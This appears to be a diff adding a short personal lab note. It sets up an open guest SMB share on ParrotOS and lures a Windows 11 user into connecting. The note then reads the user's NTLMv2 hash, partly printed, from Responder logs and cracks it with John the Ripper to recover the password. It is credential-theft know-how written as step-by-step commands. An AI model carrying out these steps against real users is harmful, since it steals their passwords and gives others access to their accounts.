@@ -1,0 +1,36 @@
+On the parrotOS
+
+make a folder on your home directory
+"SECRETFOLDERSMB"
+
+sudo systemctl start smbd
+sudo systemctl start nmbd
+sudo systemctl enable smbd
+sudo systemctl enable nmbd
+
+sudo chown -R nobody:nogroup /home/parrot/SECRETFOLDERSMB
+sudo chmod -R 0777 /home/parrot/SECRETFOLDERSMB
+sudo net usershare add SECRETFOLDERSMB /home/parrot/SECRETFOLDERSMB "A secret folder shared via SMB" everyone:F guest_ok=y
+net usershare info
+(Check if its fine)
+
+ip a 
+(172.31.43.83) enp0s5
+
+Win11
+run \\172.31.43.83
+The user enters it's credentials, and the parrotOS machine captures traffic
+
+ParrotOS
+cd /usr/share/responder/logs/
+
+you should see the hash and username
+
+"ec2-user::EC2WIN11:cea98e03389f162a:B975E1277AE96EFB60A29E588B338C39:01010........................"
+
+sudo john SMB-[TAB] and click enter
+
+then you should have the username and password.
+
+
+
